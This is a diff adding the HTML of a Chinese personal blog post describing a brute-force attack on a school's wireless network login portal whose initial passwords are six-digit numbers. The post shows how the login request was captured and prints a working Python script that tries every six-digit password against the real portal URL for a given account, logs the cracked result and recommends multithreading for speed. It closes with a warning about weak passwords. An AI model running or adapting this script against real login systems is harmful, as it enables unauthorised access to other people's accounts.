@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>python脚本-暴力破解无线网弱密码 | Welcome To Wangxt&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content>
+    <meta name="description" content="背景：学校最近重新架设无线网一体化，而初始密码为弱密码（6位数字），下面我们要做的就是通过暴力破解的方式破解弱密码！（所以建议大家以后无论是在注册还是什么情况，都千万不要使用弱密钥）攻击过程如下： 1.获取get参数在爆破之前我们需要获取一些get参数，这些参数应该包含着我们输入的登陆信息。 登陆无线网前需要在网页上进行身份验证。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python脚本-暴力破解无线网弱密码">
+<meta property="og:url" content="https://wxt406611016.github.io/2020/09/20/python脚本-暴力破解无线网弱密码/index.html">
+<meta property="og:site_name" content="Welcome To Wangxt&#39;s Blog">
+<meta property="og:description" content="背景：学校最近重新架设无线网一体化，而初始密码为弱密码（6位数字），下面我们要做的就是通过暴力破解的方式破解弱密码！（所以建议大家以后无论是在注册还是什么情况，都千万不要使用弱密钥）攻击过程如下： 1.获取get参数在爆破之前我们需要获取一些get参数，这些参数应该包含着我们输入的登陆信息。 登陆无线网前需要在网页上进行身份验证。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/26/Eni5OU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/26/EniomF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/26/EniTw4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/26/Eni7TJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/26/Enibk9.png">
+<meta property="og:updated_time" content="2019-04-25T16:00:00.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="python脚本-暴力破解无线网弱密码">
+<meta name="twitter:description" content="背景：学校最近重新架设无线网一体化，而初始密码为弱密码（6位数字），下面我们要做的就是通过暴力破解的方式破解弱密码！（所以建议大家以后无论是在注册还是什么情况，都千万不要使用弱密钥）攻击过程如下： 1.获取get参数在爆破之前我们需要获取一些get参数，这些参数应该包含着我们输入的登陆信息。 登陆无线网前需要在网页上进行身份验证。">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/04/26/Eni5OU.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Welcome To Wangxt&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/host.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">WangXT</h5>
+          <a href="mailto:wxt406611016@gmail.com" title="wxt406611016@gmail.com" class="mail">wxt406611016@gmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                Home
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://cs.cumt.edu.cn/" target="_blank" >
+                <i class="icon icon-lg icon-tags"></i>
+                CUMT
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/wxt406611016" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://weibo.com/6327552090" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">python脚本-暴力破解无线网弱密码</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">python脚本-暴力破解无线网弱密码</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-09-20T07:26:27.387Z" itemprop="datePublished" class="page-time">
+  2020-09-20
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#1-获取get参数"><span class="post-toc-number">1.</span> <span class="post-toc-text">1.获取get参数</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#python脚本暴力破解"><span class="post-toc-number">2.</span> <span class="post-toc-text">python脚本暴力破解</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！"><span class="post-toc-number">2.0.1.</span> <span class="post-toc-text">爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-python脚本-暴力破解无线网弱密码"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">python脚本-暴力破解无线网弱密码</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-09-20 15:26:27" datetime="2020-09-20T07:26:27.387Z"  itemprop="datePublished">2020-09-20</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p><strong>背景：学校最近重新架设无线网一体化，而初始密码为弱密码（6位数字），下面我们要做的就是通过暴力破解的方式破解弱密码！（所以建议大家以后无论是在注册还是什么情况，都千万不要使用弱密钥）</strong><br><strong>攻击过程如下：</strong></p>
+<h2 id="1-获取get参数"><a href="#1-获取get参数" class="headerlink" title="1.获取get参数"></a>1.获取get参数</h2><p><strong>在爆破之前我们需要获取一些get参数，这些参数应该包含着我们输入的登陆信息。</strong></p>
+<p>登陆无线网前需要在网页上进行身份验证。<br><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://s2.ax1x.com/2019/04/26/Eni5OU.png" alt="验证界面" title>
+                </div>
+                <div class="image-caption">验证界面</div>
+            </figure><br>随便输入一个账号密码，看返回结果是什么。比如输入学号：1122，密码：1231131，运营商选择联通。提示无账号，但是无所谓，毕竟我们的目的在于接下来的抓包环节。抓包看看get的网址，选择我们有用的，比如下图中get参数中包含了我们输入的信息。这很有用，因为这为我们下面的python脚本提供了url。<br><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://s2.ax1x.com/2019/04/26/EniomF.png" alt="获取输入的get参数" title>
+                </div>
+                <div class="image-caption">获取输入的get参数</div>
+            </figure><br>看一下回显结果，提示<code>&quot;result&quot;:&quot;0&quot;</code>等信息。<br><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://s2.ax1x.com/2019/04/26/EniTw4.png" alt="验证失败回显内容" title>
+                </div>
+                <div class="image-caption">验证失败回显内容</div>
+            </figure><br>我们再输入一个正确的账号密码，将get参数中的user_account和user_password换成正确的（我自己的无线网认证账号密码，账号和密码就不公布了hhhhh），看一下正确登陆后的回显内容。显示<code>&quot;result&quot;:&quot;1&quot;,&quot;认证成功&quot;</code>等信息。<br><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://s2.ax1x.com/2019/04/26/Eni7TJ.png" alt="验证正确回显内容" title>
+                </div>
+                <div class="image-caption">验证正确回显内容</div>
+            </figure><br>ok，我们可以根据回显内容的不同来判断是否验证成功。下面就可以进行暴力破解了，只需要选定一个存在的账号，然后穷举6位数字密码的所有可能性，一一验证即可。</p>
+<h2 id="python脚本暴力破解"><a href="#python脚本暴力破解" class="headerlink" title="python脚本暴力破解"></a>python脚本暴力破解</h2><p>直接上代码吧：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from time import strftime</span><br><span class="line">from itertools import product</span><br><span class="line">from time import sleep</span><br><span class="line">import requests</span><br><span class="line">from requests import post</span><br><span class="line">import re</span><br><span class="line">import threading    #可开启多线程</span><br><span class="line">import time</span><br><span class="line"> </span><br><span class="line">def fx(iter=[&apos;0123456789&apos;]):</span><br><span class="line">  def psgen(x):    #密码生成器，穷举所有的密码可能性，参数x表示密码长度</span><br><span class="line">    for r in iter:</span><br><span class="line">      for repeat in range(x,x+1):</span><br><span class="line">        for ps in product(r,repeat=repeat):</span><br><span class="line">          yield &apos;&apos;.join(ps)</span><br><span class="line">  for ps in psgen(6):</span><br><span class="line">    url=&apos;http://10.2.5.251:801/eportal/?c=Portal&amp;a=login&amp;callback=dr1556270398016&amp;login_method=1&amp;user_account=08xxxx05@unicom&amp;user_password=%s&amp;wlan_user_ip=10.3.37.27&amp;wlan_user_mac=d07e351e9bbe&amp;wlan_ac_ip=&amp;wlan_ac_name=NAS&amp;jsVersion=3.0&amp;_=1556270388759&apos;%ps</span><br><span class="line">    try:</span><br><span class="line">      s=requests.session()</span><br><span class="line">      rs=s.get(url).content.decode(&apos;utf-8&apos;)</span><br><span class="line">      r = re.findall(r&apos;认证成功&apos;,rs)        #判断验证结果</span><br><span class="line">      if r: </span><br><span class="line">        with open(&quot;resut.csv&quot;,&quot;a+&quot;) as f:    #存储密码结果到result.csv文件中</span><br><span class="line">          f.write(&apos;密码破解成功结果为：,&apos;+ ps + &apos;,&apos; + strftime(&quot;%c&quot;) + &apos;,&apos; + url+&apos;\n&apos;)</span><br><span class="line">        print(&apos;密码破解成功：&apos;+ps+&apos; ,&apos;+rs)</span><br><span class="line">        break</span><br><span class="line">      else:</span><br><span class="line">        print(ps+&apos;密码不正确&apos;+rs)</span><br><span class="line">    except:</span><br><span class="line">      sleep(1)</span><br><span class="line">      pass</span><br><span class="line">      </span><br><span class="line">fx([&apos;0123456789&apos;])</span><br></pre></td></tr></table></figure>
+<p>接下来运行等待结果就ok了。看一下运行过程图：<br><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://s2.ax1x.com/2019/04/26/Enibk9.png" alt="暴力破解过程图" title>
+                </div>
+                <div class="image-caption">暴力破解过程图</div>
+            </figure><br>由于一共的可能性有1000000种，而且每一次穷举都要进行一次网络验证，即每一次验证都有网络延时，所以要等上一会儿。大概爆破了一个多小时，终于爆出了正确结果。生成了result.csv文件，查看一下文件内容，如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密码破解成功结果为：,15xxxx,Fri Apr 26 17:28:19 2019,http://10.2.5.251:801/eportal/?c=Portal&amp;a=login&amp;callback=dr1556270398016&amp;login_method=1&amp;user_account=08xxxx05@unicom&amp;user_password=15xxxx&amp;wlan_user_ip=10.3.37.27&amp;wlan_user_mac=d07e351e9bbe&amp;wlan_ac_ip=&amp;wlan_ac_name=NAS&amp;jsVersion=3.0&amp;_=1556270388759</span><br></pre></td></tr></table></figure></p>
+<p><strong>速度慢可以开启多线程，同时进行测试。结果好很多！</strong></p>
+<h4 id="爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！"><a href="#爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！" class="headerlink" title="爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！"></a>爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！</h4><p>2019年 04月 26日 星期五 00:00:00 CST</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+
+        
+        <a href="/2020/09/20/python脚本-暴力破解无线网弱密码/" target="_blank" rel="external">https://wxt406611016.github.io/2020/09/20/python脚本-暴力破解无线网弱密码/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="https://wxt406611016.github.io">
+            <img src="/img/host.jpg" alt="WangXT">
+            WangXT
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://wxt406611016.github.io/2020/09/20/python脚本-暴力破解无线网弱密码/&title=《python脚本-暴力破解无线网弱密码》 — Welcome To Wangxt's Blog&pic=https://wxt406611016.github.io/img/host.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://wxt406611016.github.io/2020/09/20/python脚本-暴力破解无线网弱密码/&title=《python脚本-暴力破解无线网弱密码》 — Welcome To Wangxt's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://wxt406611016.github.io/2020/09/20/python脚本-暴力破解无线网弱密码/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《python脚本-暴力破解无线网弱密码》 — Welcome To Wangxt's Blog&url=https://wxt406611016.github.io/2020/09/20/python脚本-暴力破解无线网弱密码/&via=https://wxt406611016.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://wxt406611016.github.io/2020/09/20/python脚本-暴力破解无线网弱密码/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/09/20/linux配置nginx反向代理/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">linux配置nginx反向代理</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/09/20/sqli-labs(1_22)/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">sqli-labs(1~22)</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Valine Comments -->
+    <div class="comments vcomment" id="comments"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script>
+    <!-- Valine Comments script -->
+    <script>
+        var GUEST_INFO = ['nick','mail','link'];
+        var guest_info = 'nick'.split(',').filter(function(item){
+          return GUEST_INFO.indexOf(item) > -1
+        });
+        new Valine({
+            el: '#comments',
+            notify: 'false' == 'true',
+            verify: 'false' == 'true',
+            appId: "ds54farWshFsUraKxWRVVf4G-gzGzoHsz",
+            appKey: "q4rgias5HDeq09ugweytekJQ",
+            avatar: "mm",
+            placeholder: "说点什么吧!(别忘了先填写上面的昵称哦)",
+            guest_info: guest_info.length == 0 ? GUEST_INFO : guest_info,
+            pageSize: "10"
+        })
+    </script>
+    <!-- Valine Comments end -->
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>WangXT &copy; 2018 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://wxt406611016.github.io/2020/09/20/python脚本-暴力破解无线网弱密码/&title=《python脚本-暴力破解无线网弱密码》 — Welcome To Wangxt's Blog&pic=https://wxt406611016.github.io/img/host.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://wxt406611016.github.io/2020/09/20/python脚本-暴力破解无线网弱密码/&title=《python脚本-暴力破解无线网弱密码》 — Welcome To Wangxt's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://wxt406611016.github.io/2020/09/20/python脚本-暴力破解无线网弱密码/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《python脚本-暴力破解无线网弱密码》 — Welcome To Wangxt's Blog&url=https://wxt406611016.github.io/2020/09/20/python脚本-暴力破解无线网弱密码/&via=https://wxt406611016.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://wxt406611016.github.io/2020/09/20/python脚本-暴力破解无线网弱密码/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAADKUlEQVR42u3awW4iQQwE0Pz/T7NSTitFQJU9SNC8PiEymek3HCy7+ucnXrff9feb/7+/901y/d/7P77m3ueLFzY2NvaHsG8P14Z076/5TtqfJLFgY2Njn8pObpeUtOQOj19T+yqTYoaNjY2NvW8zWio2NjY29uvYsxHP49YiaX7y0oiNjY39new9rG1jktFP8v3LZ2nY2NjYb8+ejeDf8/ML821sbGzst2TfFisPADb/OxtaPXk6NjY29kHsfOyeNwD5EOoVjUceJGNjY2OfxM4PzWwO+uSjqHs7SdqkPKjGxsbGPoO9Lzn5gZ6c0YbB9WgMGxsb+zj2rAFoSbeL1ibA+Nn3W9jY2NhvyZ5lo5tENY8B2o6qSEWwsbGxj2DPDuW0D7tqo7NgoIgHsLGxsT+W3W46H+tcdRAnDwbqiBcbGxv7w9nXPvhx2Ujuk1zfNkV3OzBsbGzsI9jtYP3aKxPq/tAPNjY29jewk4Ix2+hVR3BmsUQ9S8PGxsb+QPasYOSHePLAtQ1oZyMnbGxs7FPZszC1HTNdNfrPG48nBQwbGxv7IPambZgVudkrmzUnxSAJGxsb+wPZeXloW4JNhNwOm9oih42NjX0SO6G2bUlCakPZ4fAIGxsb+wvYyYbaF9EO/TeRQL4fbGxs7FPZCWk2EsqLYls4Z0/BxsbGPpW9OY6TB6uzYLgdXW0O92BjY2N/Lrvd0KYNmJWrPH4u4gRsbGzso9ltW5KXruTK/OW2J3CwsbGxT2XXncoiTkgKz+zV57FEnwNjY2Njvzs7HwnlxaM9lLOJDWb3xMbGxj6Jna/ZMZpZgZk1JHlUgI2NjX0S+xavfTHbNDz5cCpqe7CxsbEPYrdD9hl7HznMYmBsbGzsb2DfypU/Phn6zIpW8pM8KZnY2NjYB7HbodJ+djWLhNswAxsbG/vb2G3RSoY7m/KTR8V5GPwk5cbGxsY+gt0Wj7bBaF/Wvg4/GVRhY2NjY5eA2YuYFbloV9jY2Nhfyc5H/3mrsClFsxYFGxsb+1T2pkgksessKshDiHr/2NjY2Aex24YhgW0ih/Z40FVDKGxsbOwPZP8DXQ9kF3e+h9sAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
